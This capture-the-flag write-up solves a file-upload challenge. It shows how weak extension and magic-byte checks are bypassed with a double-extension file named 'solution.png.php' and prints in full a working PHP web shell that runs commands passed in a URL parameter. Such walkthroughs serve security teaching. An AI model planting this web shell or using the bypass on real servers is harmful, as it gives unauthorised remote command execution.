After launching website, there is just a input field for file and button to upload it. 

Using `gobuster` showed us, that there is a `robots.txt` file. 
This file contains only

~~~
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/
~~~

We can check `/instructions.txt` file.

~~~
Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
~~~

From the `instructions.txt` we know that the uploaded file 
    - must begin with 'PNG'
    - must have `.png` extension
    - will be saved into `/uploads/<filename>`


So we can try to use webshell (https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985).
At the beginning, we will add the 'PNG' to bypass test before uploading.


~~~PHP
PNG
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
~~~

This file must also have .png extension, so we can just create a `solution.png.php` to bypass another check.

After succesfully uploading this file, we can go to `/uploads/solution.png.php` which enables a command line interface for us. 
Now we can look for flag in the system. I prefer to use `find / -name "*.txt"` - this searches whole system for files ending with `.txt`.

After opening found file, we get our flag.
